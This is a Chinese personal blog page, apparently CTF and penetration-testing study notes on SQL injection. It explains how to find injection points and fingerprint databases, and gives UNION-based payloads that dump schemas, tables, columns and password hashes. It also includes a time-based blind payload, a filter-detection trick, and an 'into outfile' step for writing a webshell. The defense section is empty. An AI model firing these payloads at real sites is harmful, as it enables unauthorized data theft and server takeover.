@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/blog/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/blog/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/blog/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/blog/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Microsoft Yahei:300,300italic,400,400italic,700,700italic|Menlo:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/blog/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"muted64.github.io","root":"/blog/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Sql 注入是渗透测试中的一个重要部分。这里是一些 Sql 注入相关内容的总结和整理，留待以后查阅。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入笔记">
+<meta property="og:url" content="http://muted64.github.io/blog/2020/06/01/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="MUTED&#39;s Blog">
+<meta property="og:description" content="Sql 注入是渗透测试中的一个重要部分。这里是一些 Sql 注入相关内容的总结和整理，留待以后查阅。">
+<meta property="article:published_time" content="2020-06-01T10:13:28.000Z">
+<meta property="article:modified_time" content="2020-06-16T11:35:24.972Z">
+<meta property="article:author" content="MUTED">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://muted64.github.io/blog/2020/06/01/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>SQL注入笔记 | MUTED's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/blog/atom.xml" title="MUTED's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/blog/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">MUTED's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">MUTED的网络自留地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/blog/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/blog/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/blog/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/blog/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://muted64.github.io/blog/2020/06/01/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/blog/images/avatar.png">
+      <meta itemprop="name" content="MUTED">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MUTED's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-06-01 18:13:28" itemprop="dateCreated datePublished" datetime="2020-06-01T18:13:28+08:00">2020-06-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-06-16 19:35:24" itemprop="dateModified" datetime="2020-06-16T19:35:24+08:00">2020-06-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/blog/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Sql 注入是渗透测试中的一个重要部分。这里是一些 Sql 注入相关内容的总结和整理，留待以后查阅。</p>
+<a id="more"></a>
+<h2 id="Sql-注入的本质理解">Sql 注入的本质理解</h2>
+<p>Sql 注入的本质是利用网页中可控的注入点，动态构造后端的 Sql 语句，达到注入攻击的目的。（从客户端提交特殊的代码，从而收集程序及服务器的信息，从而获取想得到的资料。）</p>
+<h2 id="Sql-注入的一般步骤">Sql 注入的一般步骤</h2>
+<ol>
+<li>判断环境、寻找注入点、判断数据库类型。</li>
+<li>根据注入参数类型，在脑海中构造大致的 Sql 语句。
+<ul>
+<li>数字型：<code>Select * from 表名 where id=1 and [查询条件]</code> （注入参数为<code>id=1 and [查询条件]</code>）</li>
+<li>字符型：<code>select * from 表名 where class='a' and [查询条件] and ''=''</code>（注入参数为<code>class=a' and [查询条件] and ''='</code>）</li>
+<li>搜索型：SQL 语句原貌大致为：<code>Select * from 表名 where 字段 like '%关键字%'</code> ,生成语句可以是<code>Select * from 表名 where 字段 like '%' and [查询条件] and '%'='%'</code> （注入参数为<code>keyword=' and [查询条件] and '%25'='</code>）（语句中的 ‘%’ 意为模糊查询，%25 经 URL 解码后为 ‘%’ ）</li>
+</ul>
+</li>
+<li>猜解表名，列名，查找需要的数据。</li>
+</ol>
+<h2 id="Sql-注入点的判断">Sql 注入点的判断</h2>
+<h3 id="常见注入点">常见注入点</h3>
+<ul>
+<li>
+<p>GET 请求：在 URL 中发送参数。</p>
+</li>
+<li>
+<p>POST 请求：数据被包含在请求体中。</p>
+</li>
+<li>
+<p><strong>其它类型的注入数据：例如 HTTP 请求头等</strong></p>
+<p>常见 http 可能被污染的参数:</p>
+<ul>
+<li>User-agent 浏览器版本 （少）</li>
+<li>Referer 来源（少）</li>
+<li>X-Forwarded-For 获取 ip（多）</li>
+<li>client_ip 获取 ip（多）</li>
+<li>cookie 获取 cookie 值（多）</li>
+</ul>
+</li>
+</ul>
+<h3 id="注入点判断方法">注入点判断方法</h3>
+<h4 id="返回错误信息">返回错误信息</h4>
+<p><strong>单引号判断法：</strong></p>
+<p>在参数后面加上单引号并观察。<strong>如果页面返回错误，则存在 Sql 注入</strong>，即存在可被我们控制的动态构造部分。 原因是<strong>无论字符型还是整型都会因为单引号个数不匹配而报错</strong>。出现单引号个数不匹配说明某部分后端代码用我们提供的多一个引号的参数动态构造后多出了一个引号。同时，这种方法在页面出现错误信息的时候也可以判断数据库类型。</p>
+<p><em>实例：</em></p>
+<blockquote>
+<p>在网站首页上，有名为“IE 不能打开新窗口的多种解决方法”的链接，地址为：<code>http://www.mytest.com/showdetail.asp?id=49</code>，我们在这个地址后面加上单引号’，服务器返回下面的错误提示：</p>
+<blockquote>
+<p>Microsoft JET Database Engine 错误 ‘80040e14’</p>
+<p>字符串的语法错误 在查询表达式 ‘ID=49’’ 中。<br>
+/showdetail.asp，行 8</p>
+</blockquote>
+<p><strong>从这个错误提示我们能看出：</strong></p>
+<ul>
+<li>网站使用的是 Access 数据库，通过 JET 引擎连接数据库，而不是通过 ODBC。 //引擎及数据库信息</li>
+<li>程序没有判断客户端提交的数据是否符合程序要求。 //对注入的可能性的判断</li>
+<li>该 SQL 语句所查询的表中有一名为 ID 的字段。 //对字段的判断</li>
+</ul>
+</blockquote>
+<h4 id="不返回错误信息">不返回错误信息</h4>
+<p>上述的单引号判断法简便易用，但并不适用于所有的情况，具体解释如下：</p>
+<blockquote>
+<p>1.不一定每台服务器的 IIS 都返回具体错误提示给客户端，如果程序中加了 cint(参数)之类语句的话，Sql 注入是不会成功的，但服务器同样会报错，具体提示信息为处理 URL 时服务器上出错。请和系统管理员联络。 2.部分对 Sql 注入有一点了解的程序员，认为只要把单引号过滤掉就安全了，这种情况不为少数，如果你用单引号测试，是测不到注入点的，所以进一步的判断是有必要的。</p>
+</blockquote>
+<p>此时一个经典的方法是<strong>借助 and 和 or 来判断：</strong></p>
+<ul>
+<li>
+<p>数字型：当输入的参数 <strong>x</strong> 为<strong>整型</strong>时，通常 php 文件中 Sql 语句类型大致如下： <code>select * from &lt;表名&gt; where id = x</code> 。 这种类型可以先用 <code>and 1=1</code> 和 <code>and 1=2</code> 来做尝试：</p>
+<p><em>实例：</em></p>
+<blockquote>
+<p>① <code>http://www.mytest.com/showdetail.asp?id=49</code><br>
+② <code>http://www.mytest.com/showdetail.asp?id=49 and 1=1</code><br>
+③ <code>http://www.mytest.com/showdetail.asp?id=49 and 1=2</code></p>
+<p><strong>可以注入的表现：</strong><br>
+① 正常显示<br>
+② 正常显示，内容基本与 ① 相同。</p>
+<p>后台执行 Sql 语句大致为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> <span class="keyword">id</span> = x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>没有语法错误且逻辑判断为正确，所以返回正常。</p>
+<p>③ 提示 BOF 或 EOF（程序没做任何判断时）、或提示找不到记录（判断了 rs.eof 时）、或显示内容为空（程序加了 on error resume next）</p>
+<p>后台执行 Sql 语句大致为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &lt;表名&gt; <span class="keyword">where</span> <span class="keyword">id</span> = x <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>
+<p>没有语法错误但是逻辑判断为假，所以返回错误。</p>
+<p><strong>不可以注入的表现：</strong></p>
+<p>① 同样正常显示，② 和 ③ 一般都会有程序定义的错误提示，或提示类型转换时出错。</p>
+</blockquote>
+<p>或者我们也可以先把参数改为很大的数或负数，要让它查询不到数据，再在最后加上 or 1=1 就成功返回了数据，这是因为 1=1 为真，不管前面是不是假，数据都会返回。当 or 1=2 时，因为 1=2 为假，前后都为假，最终也是假，数据就不会返回了。</p>
+</li>
+<li>
+<p>字符型：当输入的参数 <strong>x 为字符型</strong>时，通常 php 文件中 SQL 语句类型大致如下： <code>select * from &lt;表名&gt; where id = 'x'</code> 这种类型我们同样可以使用 <code>and '1'='1</code> 和 <code>and '1'='2</code>来判断：</p>
+<blockquote>
+<p>① URL 地址中输入 <code>http://xxx/abc.php?id= x' and '1'='1</code> 页面运行正常，继续进行下一步。</p>
+<p>② URL 地址中输入 <code>http://xxx/abc.php?id= x' and '1'='2</code> 页面运行错误，则说明此 Sql 注入为字符型注入。</p>
+</blockquote>
+</li>
+<li>
+<p>除此之外还有搜索型注入，等做到相关题目再行补充。</p>
+</li>
+</ul>
+<h2 id="漏洞利用">漏洞利用</h2>
+<h3 id="数据库类型判断">数据库类型判断</h3>
+<h4 id="通过网站脚本类型判断">通过网站脚本类型判断</h4>
+<ul>
+<li>PHP -&gt; Oracle、MySQL</li>
+<li>JSP -&gt; Oracle、MySQL</li>
+<li>ASP/.NET -&gt; SQL Server</li>
+</ul>
+<h4 id="通过错误信息判断">通过错误信息判断</h4>
+<ul>
+<li>MySQL -&gt; <code>error:You have an error in your SQL syntax; check themanual that corresponds to your MySQL server version</code></li>
+<li>Oracle -&gt; <code>Microsoft OLE DB Provider for ODBC Drivers 错误</code></li>
+</ul>
+<h4 id="通过数字函数判断">通过数字函数判断</h4>
+<ul>
+<li>SQL Server -&gt; <code>@@pack_received、@@rowcount</code></li>
+<li>MySQL -&gt; <code>connection_id()、last_insert_id() 、 row_count()</code></li>
+<li>Oracle -&gt; <code>BITAND(1,1)</code></li>
+<li>PostgreSQL -&gt; <code>select EXTRACT(DOW FROMNOW())</code></li>
+</ul>
+<h3 id="通过-UNION-语句提取数据">通过 UNION 语句提取数据</h3>
+<blockquote>
+<p>UNION 操作符可以合并两条或多条 SELECT 语句的查询结果，基本语法如下：<br>
+<code>select column1 column2 from table1 UNION select column1 column2 from table2</code></p>
+</blockquote>
+<p><strong>使用 UNION 语句需要满足的条件：</strong> 前后两个查询的列数及对应列的数据类型必须相等。</p>
+<p><em>一般过程为：</em></p>
+<h4 id="获得列数">获得列数</h4>
+<p>使用 <code>order by</code> 语句。最大且不报错的数值即为列数。</p>
+<h4 id="获得回显点">获得回显点</h4>
+<p>使用 <code>union select</code> 语句，查看回显点。</p>
+<p><em>使用例：</em> <code>?id=-1' union select 1,2,3 %23</code></p>
+<blockquote>
+<p>说明：</p>
+<p>先查询一个<strong>不存在的参数</strong>，本应该返回空的；<br>
+但是使用 UNION 查询，会输出后面的查询；<br>
+用<strong>数字去占位</strong>，所以能看到的数字就是回显点。</p>
+</blockquote>
+<h4 id="猜解数据库">猜解数据库</h4>
+<ul>
+<li>
+<p>数据库版本信息：</p>
+<p><code>?id=' union select 1, version(), 3 %23</code></p>
+</li>
+<li>
+<p>当前数据库和用户：</p>
+<p><code>?id=' union select 1, database(), user() %23</code></p>
+</li>
+<li>
+<p>所有数据库：</p>
+<p><code>?id=' union select 1, (select group_concat(schema_name) from information_schema.schemata), 3 %23</code></p>
+</li>
+<li>
+<p>表名：</p>
+<p><code>?id=' union select 1, (select group_concat(table_name) from information_schema.tables where table_schema='&lt;当前数据库名称&gt;'), 3 %23</code></p>
+</li>
+<li>
+<p>列名：</p>
+<p><code>?id=' union select 1, (select group_concat(column_name) from information_schema.columns where table_schema='&lt;当前数据库名称&gt;' and table_name='&lt;当前表名&gt;'), 3 %23</code></p>
+</li>
+<li>
+<p>字段值 ( 其中 separator 可选 ) ：</p>
+<p><code>?id=' union select 1,(select group_concat(&lt;查询到的列名&gt; separator ;) from &lt;当前表名&gt;), 3 %23</code></p>
+</li>
+</ul>
+<h4 id="获取哈希口令">获取哈希口令</h4>
+<blockquote>
+<p>哈希口令是通过使用 PASSWORD() 函数计算的，具体算法取决于 MySQL 安装的版本。<br>
+<code>select password('admin')</code><br>
+也可以通过在线解密网站进行解密。如 <a href="http://www.cmd5.com/" target="_blank" rel="noopener">CMD5</a></p>
+</blockquote>
+<h4 id="写入-Webshell">写入 Webshell</h4>
+<blockquote>
+<p>需要得到网站的绝对路径，数据库管理系统有向服务器文件系统写文件的权限。<br>
+<code>?id=1' union select &quot;&quot; into outfile &quot;D:\\XXX\\conn.php&quot;%23</code></p>
+</blockquote>
+<h3 id="盲注">盲注</h3>
+<p>上述是用有回显注入举例说明 Sql 注入的基本过程的例子，盲注过程与此类似，只不过没有回显<br>
+需要逐位尝试。</p>
+<h4 id="时间盲注">时间盲注</h4>
+<p><code>id=1 union select 1，if(SUBSTRING(user(),1,4)='root',sleep(5),1),3</code>（substring 函数的作用是将 user()从第一位字母到第四位字母截断。这段参数的注入逻辑是，user()的第一位到第四位如果为’root’，则页面等待 5 秒，否则结果为 1。）</p>
+<p>脚本：待补充</p>
+<h4 id="布尔盲注">布尔盲注</h4>
+<p>脚本：待补充</p>
+<h2 id="绕过方式">绕过方式</h2>
+<h3 id="检测过滤的字符串">检测过滤的字符串</h3>
+<p>可用异或注入检测过滤的字符串。异或即两个条件同真或同假即为假，两条件一真一假则为真。</p>
+<p>样例如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;^(length(&#39;and&#39;)!&#x3D;0)--+</span><br></pre></td></tr></table></figure>
+<p>此样例可用来判断 and 是否被过滤。若满足异或条件则返回 id=0 对应的值，即被过滤。不满足异或条件则返回 id=1 对应的值，即未被过滤。也可以用<code>xor</code>来构造语句。</p>
+<p>不过，有的时候需要使用 <code>=</code> 而不是 <code>!=</code> 来判断。例如，WAF 过滤了 or，那么 order 的 length 就为 3，虽然不等于 0，但是没有 order 的功能了。</p>
+<h2 id="防御相关">防御相关</h2>
+<p>目前还没什么概念，等以后再补充。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/blog/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/blog/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/blog/2020/06/16/PHP%E7%9B%B8%E5%85%B3%E5%A7%BF%E5%8A%BF/" rel="next" title="PHP相关姿势">
+      PHP相关姿势 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Sql-注入的本质理解"><span class="nav-number">1.</span> <span class="nav-text">Sql 注入的本质理解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sql-注入的一般步骤"><span class="nav-number">2.</span> <span class="nav-text">Sql 注入的一般步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sql-注入点的判断"><span class="nav-number">3.</span> <span class="nav-text">Sql 注入点的判断</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见注入点"><span class="nav-number">3.1.</span> <span class="nav-text">常见注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入点判断方法"><span class="nav-number">3.2.</span> <span class="nav-text">注入点判断方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#返回错误信息"><span class="nav-number">3.2.1.</span> <span class="nav-text">返回错误信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不返回错误信息"><span class="nav-number">3.2.2.</span> <span class="nav-text">不返回错误信息</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#数据库类型判断"><span class="nav-number">4.1.</span> <span class="nav-text">数据库类型判断</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#通过网站脚本类型判断"><span class="nav-number">4.1.1.</span> <span class="nav-text">通过网站脚本类型判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通过错误信息判断"><span class="nav-number">4.1.2.</span> <span class="nav-text">通过错误信息判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通过数字函数判断"><span class="nav-number">4.1.3.</span> <span class="nav-text">通过数字函数判断</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过-UNION-语句提取数据"><span class="nav-number">4.2.</span> <span class="nav-text">通过 UNION 语句提取数据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#获得列数"><span class="nav-number">4.2.1.</span> <span class="nav-text">获得列数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获得回显点"><span class="nav-number">4.2.2.</span> <span class="nav-text">获得回显点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#猜解数据库"><span class="nav-number">4.2.3.</span> <span class="nav-text">猜解数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取哈希口令"><span class="nav-number">4.2.4.</span> <span class="nav-text">获取哈希口令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写入-Webshell"><span class="nav-number">4.2.5.</span> <span class="nav-text">写入 Webshell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#盲注"><span class="nav-number">4.3.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#时间盲注"><span class="nav-number">4.3.1.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#布尔盲注"><span class="nav-number">4.3.2.</span> <span class="nav-text">布尔盲注</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过方式"><span class="nav-number">5.</span> <span class="nav-text">绕过方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测过滤的字符串"><span class="nav-number">5.1.</span> <span class="nav-text">检测过滤的字符串</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御相关"><span class="nav-number">6.</span> <span class="nav-text">防御相关</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="MUTED"
+      src="/blog/images/avatar.png">
+  <p class="site-author-name" itemprop="name">MUTED</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/blog/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/blog/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/blog/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/MTDi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;MTDi" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:muted32555664@gmail.com" title="E-Mail → mailto:muted32555664@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/blog/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="author" itemprop="copyrightHolder">MUTED</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">46k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">42 分钟</span>
+</div>
+  <!--<div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+  -->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/blog/lib/anime.min.js"></script>
+  <script src="/blog/lib/velocity/velocity.min.js"></script>
+  <script src="/blog/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/blog/js/utils.js"></script>
+
+<script src="/blog/js/motion.js"></script>
+
+
+<script src="/blog/js/schemes/pisces.js"></script>
+
+
+<script src="/blog/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/blog/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+</body>
+</html>
